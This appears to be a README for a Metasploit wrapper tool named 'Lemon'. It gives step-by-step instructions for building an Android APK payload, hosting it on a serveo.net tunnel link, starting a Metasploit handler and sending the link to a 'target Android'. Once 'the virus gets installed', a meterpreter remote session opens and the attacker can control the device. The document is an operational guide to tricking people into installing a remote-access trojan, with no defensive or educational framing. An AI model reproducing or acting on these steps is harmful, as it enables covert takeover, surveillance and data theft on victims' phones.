.Requirements :-
1. Metasploit-Framework

Installation :-
1. Install it by executing "cd $HOME/Lemon && sh Install" without quotes.

How to use :-

1.Run php by typing "php"

2.Run ssh by typing "ssh" and copy the link you get.   [NEW SESSION]

3.Forward TCP comnections by typing "payload", choose a port of your own and the payload's name, it will take a little time to create and upload the payload with the specified port and name.

4.Type "Handler" and wait for the Handler to start, then type "set LPORT xxxx" Put your port instead of xxxx, and finally type "run"   [NEW SESSION]

5.Now, put your payload's name after the link that you got after running "ssh" [For Example : lente.serveo.net/Name.apk] and send the link to the target Android, once the virus gets installed in the target device, you will see a meterpreter session opening, wait for a few seconds.
  Now you can mess with the Android device using the commnands listed.
